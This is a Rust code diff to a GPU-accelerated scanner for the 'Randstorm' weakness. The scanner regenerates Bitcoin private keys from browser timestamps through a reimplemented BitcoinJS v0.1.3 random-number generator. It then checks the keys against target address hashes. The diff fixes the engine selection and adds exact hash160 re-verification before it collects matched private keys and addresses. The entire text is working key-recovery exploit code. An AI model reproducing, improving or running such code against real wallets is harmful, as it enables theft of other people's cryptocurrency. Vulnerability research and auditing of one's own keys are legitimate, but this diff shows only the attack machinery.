@@ -68,7 +68,7 @@ impl GpuScanner {
         let platform = Platform::default();
         let device = Device::first(platform).context("No OpenCL device found")?;
 
-        println!("🔧 Initializing GPU: {}", device.name()?);
+        println!("\u{1f527} Initializing GPU: {}", device.name()?);
         let max_compute_units_result = device.info(ocl::enums::DeviceInfo::MaxComputeUnits)?;
         let global_mem = device.info(ocl::enums::DeviceInfo::GlobalMemSize)?;
 
@@ -278,25 +278,38 @@ impl GpuScanner {
             .context("Failed to read results")?;
 
         // Process matches
+        // FIX 2 (partial): kernel now returns exact target index (i+1) or 0.
+        // We use that index to do exact hash160 CPU re-verification before accepting.
         let mut matches = Vec::new();
         let secp = Secp256k1::new();
 
         for (idx, &match_val) in results.iter().enumerate() {
             if match_val > 0 {
-                // Recreate the key from fingerprint (CPU verification)
                 let fp = &fingerprints[idx];
+                // FIX 2: Use self.engine instead of hardcoded V8Mwc1616
                 if let Ok(secret_key) = self.derive_key_from_fingerprint(fp) {
                     let public_key = PublicKey::from_secret_key(&secp, &secret_key);
-                    // Generate address for verification
-                    let address =
-                        crate::scans::randstorm::derivation::derive_p2pkh_address(&public_key);
 
-                    matches.push(MatchedKey {
-                        private_key: secret_key,
-                        public_key,
-                        address,
-                        fingerprint: fp.clone(),
-                    });
+                    // Exact CPU re-verification: recompute hash160 and compare
+                    let derived_hash = super::derivation::derive_address_hash(&public_key);
+                    // match_val is i+1 (kernel fix), so target index = match_val - 1
+                    let target_idx = (match_val - 1) as usize;
+                    let exact_match = if target_idx < target_hashes.len() {
+                        derived_hash.as_slice() == target_hashes[target_idx].as_slice()
+                    } else {
+                        // Fallback: linear scan if index out of range
+                        target_hashes.iter().any(|h| derived_hash.as_slice() == h.as_slice())
+                    };
+
+                    if exact_match {
+                        let address = crate::scans::randstorm::derivation::derive_p2pkh_address(&public_key);
+                        matches.push(MatchedKey {
+                            private_key: secret_key,
+                            public_key,
+                            address,
+                            fingerprint: fp.clone(),
+                        });
+                    }
                 }
             }
         }
@@ -313,15 +326,20 @@ impl GpuScanner {
     }
 
     /// Derive private key from browser fingerprint (CPU implementation for verification)
+    /// FIX 2: Uses self.engine instead of hardcoded V8Mwc1616
     #[allow(dead_code)]
     fn derive_key_from_fingerprint(
         &self,
         fp: &BrowserFingerprint,
     ) -> Result<SecretKey> {
         use super::prng::bitcoinjs_v013::BitcoinJsV013Prng;
-
-        let key_bytes =
-            BitcoinJsV013Prng::generate_privkey_bytes(fp.timestamp_ms, super::prng::MathRandomEngine::V8Mwc1616, None);
+        // FIX 2: was hardcoded MathRandomEngine::V8Mwc1616, now uses self.engine
+        // This fixes correctness for Java/Safari/MSVC engine modes
+        let key_bytes = BitcoinJsV013Prng::generate_privkey_bytes(
+            fp.timestamp_ms,
+            self.engine,
+            None,
+        );
         SecretKey::from_slice(&key_bytes).context("Invalid secret key generated from fingerprint")
     }
 
